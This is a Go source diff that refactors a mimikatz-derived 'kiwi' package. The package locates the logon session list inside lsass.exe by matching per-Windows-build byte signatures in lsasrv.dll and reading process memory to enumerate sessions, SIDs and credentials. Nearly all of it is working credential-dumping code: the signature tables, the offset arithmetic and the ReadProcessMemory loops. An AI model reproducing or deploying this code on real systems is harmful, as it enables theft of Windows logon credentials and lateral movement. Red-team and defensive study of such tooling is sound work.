@@ -2,18 +2,40 @@ package kiwi
 
 import (
 	"bytes"
-	"fmt"
-	"strings"
+	"runtime"
+	"sync"
 	"time"
 	"unsafe"
 
 	"github.com/pkg/errors"
 	"golang.org/x/sys/windows"
 
-	"project/internal/convert"
 	"project/internal/logger"
 	"project/internal/module/windows/api"
 )
+
+// session is contains information about logon session list.
+type session struct {
+	ctx *Kiwi
+
+	// address about logon session list
+	listAddr      uintptr
+	listCountAddr uintptr
+
+	mu sync.Mutex
+}
+
+func newSession(ctx *Kiwi) *session {
+	return &session{ctx: ctx}
+}
+
+func (session *session) logf(lv logger.Level, format string, log ...interface{}) {
+	session.ctx.logger.Printf(lv, "kiwi-session", format, log...)
+}
+
+func (session *session) log(lv logger.Level, log ...interface{}) {
+	session.ctx.logger.Println(lv, "kiwi-session", log...)
+}
 
 // reference:
 // https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
@@ -40,9 +62,10 @@ var (
 	patternWin1803X64LogonSessionList = []byte{
 		0x33, 0xFF, 0x45, 0x89, 0x37, 0x48, 0x8B, 0xF3, 0x45, 0x85, 0xC9, 0x74,
 	}
-	// key = build version
-	lsaSrvReferencesX64 = map[uint32]*patchGeneric{
-		buildWinXP: {
+
+	lsaSrvReferencesX64 = []*patchGeneric{
+		{
+			minBuild: buildWinXP,
 			search: &patchPattern{
 				length: len(patternWin5xX64LogonSessionList),
 				data:   patternWin5xX64LogonSessionList,
@@ -50,7 +73,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -4, off1: 0},
 		},
-		buildWin2003: {
+		{
+			minBuild: buildWin2003,
 			search: &patchPattern{
 				length: len(patternWin5xX64LogonSessionList),
 				data:   patternWin5xX64LogonSessionList,
@@ -58,7 +82,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -4, off1: -45},
 		},
-		buildWinVista: {
+		{
+			minBuild: buildWinVista,
 			search: &patchPattern{
 				length: len(patternWin60X64LogonSessionList),
 				data:   patternWin60X64LogonSessionList,
@@ -66,7 +91,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 21, off1: -4},
 		},
-		buildWin7: {
+		{
+			minBuild: buildWin7,
 			search: &patchPattern{
 				length: len(patternWin61X64LogonSessionList),
 				data:   patternWin61X64LogonSessionList,
@@ -74,7 +100,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 19, off1: -4},
 		},
-		buildWin8: {
+		{
+			minBuild: buildWin8,
 			search: &patchPattern{
 				length: len(patternWin6xX64LogonSessionList),
 				data:   patternWin6xX64LogonSessionList,
@@ -82,7 +109,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 16, off1: -4},
 		},
-		buildWinBlue: {
+		{
+			minBuild: buildWinBlue,
 			search: &patchPattern{
 				length: len(patternWin63X64LogonSessionList),
 				data:   patternWin63X64LogonSessionList,
@@ -90,7 +118,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 36, off1: -6},
 		},
-		buildWin10v1507: {
+		{
+			minBuild: buildWin10v1507,
 			search: &patchPattern{
 				length: len(patternWin6xX64LogonSessionList),
 				data:   patternWin6xX64LogonSessionList,
@@ -98,7 +127,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 16, off1: -4},
 		},
-		buildWin10v1703: {
+		{
+			minBuild: buildWin10v1703,
 			search: &patchPattern{
 				length: len(patternWin1703X64LogonSessionList),
 				data:   patternWin1703X64LogonSessionList,
@@ -106,7 +136,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 23, off1: -4},
 		},
-		buildWin10v1803: {
+		{
+			minBuild: buildWin10v1803,
 			search: &patchPattern{
 				length: len(patternWin1803X64LogonSessionList),
 				data:   patternWin1803X64LogonSessionList,
@@ -114,7 +145,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 23, off1: -4},
 		},
-		buildWin10v1903: {
+		{
+			minBuild: buildWin10v1903,
 			search: &patchPattern{
 				length: len(patternWin6xX64LogonSessionList),
 				data:   patternWin6xX64LogonSessionList,
@@ -141,9 +173,10 @@ var (
 	patternWin6xX86LogonSessionList = []byte{
 		0x8B, 0x4D, 0xE8, 0x8B, 0x45, 0xF4, 0x89, 0x75, 0xEC, 0x89, 0x01, 0x85, 0xFF, 0x74,
 	}
-	// key = build version
-	lsaSrvReferencesX86 = map[uint32]*patchGeneric{
-		buildWinXP: {
+
+	lsaSrvReferencesX86 = []*patchGeneric{
+		{
+			minBuild: buildWinXP,
 			search: &patchPattern{
 				length: len(patternWin5xX86LogonSessionList),
 				data:   patternWin5xX86LogonSessionList,
@@ -151,7 +184,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 24, off1: 0},
 		},
-		buildWin2003: {
+		{
+			minBuild: buildWin2003,
 			search: &patchPattern{
 				length: len(patternWin7X86LogonSessionList),
 				data:   patternWin7X86LogonSessionList,
@@ -159,7 +193,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -11, off1: -43},
 		},
-		buildWinVista: {
+		{
+			minBuild: buildWinVista,
 			search: &patchPattern{
 				length: len(patternWin7X86LogonSessionList),
 				data:   patternWin7X86LogonSessionList,
@@ -167,7 +202,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: -11, off1: -42},
 		},
-		buildWin8: {
+		{
+			minBuild: buildWin8,
 			search: &patchPattern{
 				length: len(patternWin80X86LogonSessionList),
 				data:   patternWin80X86LogonSessionList,
@@ -175,7 +211,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 18, off1: -4},
 		},
-		buildWinBlue: {
+		{
+			minBuild: buildWinBlue,
 			search: &patchPattern{
 				length: len(patternWin81X86LogonSessionList),
 				data:   patternWin81X86LogonSessionList,
@@ -183,7 +220,8 @@ var (
 			patch:   &patchPattern{length: 0, data: nil},
 			offsets: &patchOffsets{off0: 16, off1: -4},
 		},
-		buildWin10v1507: {
+		{
+			minBuild: buildWin10v1507,
 			search: &patchPattern{
 				length: len(patternWin6xX86LogonSessionList),
 				data:   patternWin6xX86LogonSessionList,
@@ -194,12 +232,17 @@ var (
 	}
 )
 
-func (kiwi *Kiwi) searchLogonSessionListAddress(pHandle windows.Handle) error {
-
-	// buildWin10v1903
-	patch := lsaSrvReferencesX64[buildWin10v1507]
-
-	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
+func (session *session) searchAddress(pHandle windows.Handle) error {
+	var patches []*patchGeneric
+	switch runtime.GOARCH {
+	case "386":
+		patches = lsaSrvReferencesX86
+	case "amd64":
+		patches = lsaSrvReferencesX64
+	}
+	_, _, build := session.ctx.getWindowsVersion()
+	patch := selectGenericPatch(patches, build)
+	lsasrv, err := session.ctx.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
 	}
@@ -221,18 +264,18 @@ func (kiwi *Kiwi) searchLogonSessionListAddress(pHandle windows.Handle) error {
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about logon session list address")
 	}
-	logonSessionListAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
-	kiwi.logf(logger.Debug, "logon session list address is 0x%X", logonSessionListAddr)
+	listAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
+	session.logf(logger.Debug, "logon session list address is 0x%X", listAddr)
 	// read logon session list count
 	address = lsasrv.address + uintptr(index+patch.offsets.off1)
 	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about logon session list count")
 	}
-	logonSessionListCountAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
-	kiwi.logf(logger.Debug, "logon session list count address is 0x%X", logonSessionListCountAddr)
-	kiwi.logonSessionListAddr = logonSessionListAddr
-	kiwi.logonSessionListCountAddr = logonSessionListCountAddr
+	listCountAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
+	session.logf(logger.Debug, "logon session list count address is 0x%X", listCountAddr)
+	session.listAddr = listAddr
+	session.listCountAddr = listCountAddr
 	return nil
 }
 
@@ -565,23 +608,23 @@ type LogonSession struct {
 	Credentials []*Credential
 }
 
-func (kiwi *Kiwi) getLogonSessionList(pHandle windows.Handle) ([]*LogonSession, error) {
-	kiwi.mu.Lock()
-	defer kiwi.mu.Unlock()
-	if kiwi.logonSessionListAddr == 0 {
-		err := kiwi.searchLogonSessionListAddress(pHandle)
+func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*LogonSession, error) {
+	session.mu.Lock()
+	defer session.mu.Unlock()
+	if session.listAddr == 0 {
+		err := session.searchAddress(pHandle)
 		if err != nil {
-			return nil, errors.WithMessage(err, "failed to search logon session list address")
+			return nil, errors.WithMessage(err, "failed to search address about logon session list")
 		}
 	}
-	address := kiwi.logonSessionListCountAddr
 	// get session list count
+	address := session.listCountAddr
 	var count uint32
 	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), unsafe.Sizeof(count))
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read logon session list count")
 	}
-	kiwi.log(logger.Debug, "logon session list count is", count)
+	session.log(logger.Debug, "logon session list count is", count)
 
 	// var retCallback bool
 
@@ -590,7 +633,7 @@ func (kiwi *Kiwi) getLogonSessionList(pHandle windows.Handle) ([]*LogonSession, 
 	// get session list
 	var sessions []*LogonSession
 	const listEntrySize = 2 * unsafe.Sizeof(uintptr(0))
-	listAddr := kiwi.logonSessionListAddr - listEntrySize
+	listAddr := session.listAddr - listEntrySize
 	for i := uint32(0); i < count; i++ {
 		listAddr += listEntrySize
 		// read logon session data address
@@ -624,9 +667,9 @@ func (kiwi *Kiwi) getLogonSessionList(pHandle windows.Handle) ([]*LogonSession, 
 			if err != nil {
 				return nil, err
 			}
-			sid, err := readSIDFromLsass(pHandle, *(*uintptr)(unsafe.Pointer(&buf[enum.offsetToSID])))
+			sid, err := session.ctx.lsass.ReadSID(pHandle, *(*uintptr)(unsafe.Pointer(&buf[enum.offsetToSID])))
 			if err != nil {
-				kiwi.log(logger.Debug, "failed to read SID from lsass.exe:", err)
+				session.log(logger.Debug, "failed to read SID from lsass.exe:", err)
 			}
 			logonID := *(*windows.LUID)(unsafe.Pointer(&buf[enum.offsetToLogonID]))
 			session := LogonSession{
@@ -643,26 +686,6 @@ func (kiwi *Kiwi) getLogonSessionList(pHandle windows.Handle) ([]*LogonSession, 
 	return sessions, nil
 }
 
-func readSIDFromLsass(pHandle windows.Handle, address uintptr) (string, error) {
-	var n byte
-	_, err := api.ReadProcessMemory(pHandle, address+1, &n, 1)
-	if err != nil {
-		return "", errors.WithMessage(err, "failed to read number about SID")
-	}
-	// version + number + SID identifier authority + value
-	size := uintptr(1 + 1 + 6 + 4*n)
-	buf := make([]byte, size)
-	_, err = api.ReadProcessMemory(pHandle, address, &buf[0], size)
-	if err != nil {
-		return "", errors.WithMessage(err, "failed to read SID")
-	}
-	// identifier authority
-	ia := convert.BEBytesToUint32(buf[4:8])
-	format := "S-%d-%d" + strings.Repeat("-%d", int(n))
-	// format SID
-	v := []interface{}{buf[0], ia}
-	for i := 8; i < len(buf); i += 4 {
-		v = append(v, convert.LEBytesToUint32(buf[i:i+4]))
-	}
-	return fmt.Sprintf(format, v...), nil
+func (session *session) Close() {
+	session.ctx = nil
 }
